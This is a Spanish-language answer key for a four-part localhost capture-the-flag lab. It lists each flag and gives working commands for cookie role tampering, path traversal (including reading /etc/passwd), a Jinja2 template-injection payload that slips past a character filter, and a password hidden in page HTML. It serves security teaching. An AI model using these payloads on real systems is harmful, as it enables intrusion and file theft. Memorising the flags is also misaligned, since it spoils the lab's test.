# Solución — SecureCorp (4 retos)

## 1. Portal de empleados — Cookie tampering
**Flag:** `flag{5849BEF4D723FABC30D58334035825C8818C2FE7A4B99098F076D782C75C01B0}`

La app guarda tu rol en una cookie `role` **sin `HttpOnly`**, editable desde el
navegador. Empiezas como `role=guest`.

1. Abre DevTools → Application → Cookies → cambia `role` de `guest` a `admin`.
2. Recarga. El portal muestra el secreto corporativo.

```bash
curl -s --cookie 'role=admin' http://localhost:5000 | grep -o 'flag{5849[^<]*'
```

## 2. Centro de documentación — LFI / Path Traversal
**Flag:** `flag{lf1_d1r3ct0ry_tr4v3rs4l_v4ult_l34k}`

El visor sirve documentos desde un directorio público **muy anidado**
(`srv/www/public/docs/`) con el parámetro `?doc=`, sin sanear la ruta. Hay que
**subir varios niveles con `../`** para salir de ahí. La flag está en
`srv/private/flag.txt`, tres niveles por encima:

```
srv/www/public/docs/   <- desde aquí se sirven los .md
srv/www/public/
srv/www/
srv/private/flag.txt   <- objetivo
```

```bash
curl -s 'http://localhost:5000/?doc=../../../private/flag.txt'
# también: ?doc=/etc/passwd  ·  ?doc=../../../../app.py  ·  ?doc=../../../../flag.txt (flag del SSTI)
```

## 3. Compositor de alertas — SSTI (Jinja2) con bypass de WAF
**Flag:** `flag{sst1_f1lt3r_byp4ss_w1th_h3x_3sc4p3s}`

El mensaje se renderiza como plantilla Jinja2. Solo se anuncian merge tags
`[name]`, pero `{{ ... }}` también se evalúa (`{{ 7*6 }}` → `42`). Un filtro
silencioso bloquea `_` y palabras como `os`, `class`, `import`... y al rechazar
muestra un aviso genérico ("caracteres no compatibles con las fuentes").

Bypass: `_` se escribe como `\x5f` (escape hex que Jinja interpreta en la
cadena), y `|attr('...')` alcanza los dunder sin escribir el punto:

```
{{ (self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f'))['\x5f\x5fbuiltins\x5f\x5f']['open']('flag.txt').read() }}
```

Pégalo en el campo "Mensaje" → la vista previa muestra la flag.

## 4. Desbloqueo de administración — contraseña oculta en el HTML
**Flag:** `flag{h1dd3n_1n_pl41n_s1ght_css_c4m0fl4g3}`

La clave de mantenimiento **está en el HTML pero es invisible en pantalla**: va
dentro del texto legal del pie, con el color del texto en transparente
(`color:#11183300`, alfa `00`). No es un comentario.

Cómo encontrarla:
- "Ver código fuente" (Ctrl+U) y buscar `maintenance key`, o
- Seleccionar todo el texto de la página (Ctrl+A) — el texto invisible se resalta, o
- Inspeccionar el `<p class="legal">` en DevTools.

Clave: `mnt-r00t-7f3c-securecorp`. Introdúcela en "Desbloqueo de administración".

```bash
curl -s http://localhost:5000 | grep -o 'maintenance key = [^ ]*'
curl -s -X POST http://localhost:5000 --data-urlencode 'pw=mnt-r00t-7f3c-securecorp' | grep -o 'flag{h1dd3n[^<]*'
```

## Lección
Una misma interfaz "de producto" puede esconder fallos muy distintos: confianza
en datos del cliente (cookie), entrada no validada usada como ruta (LFI),
entrada renderizada como plantilla (SSTI) y secretos en el front-end (la clave
oculta). La seguridad de cliente nunca es seguridad real.
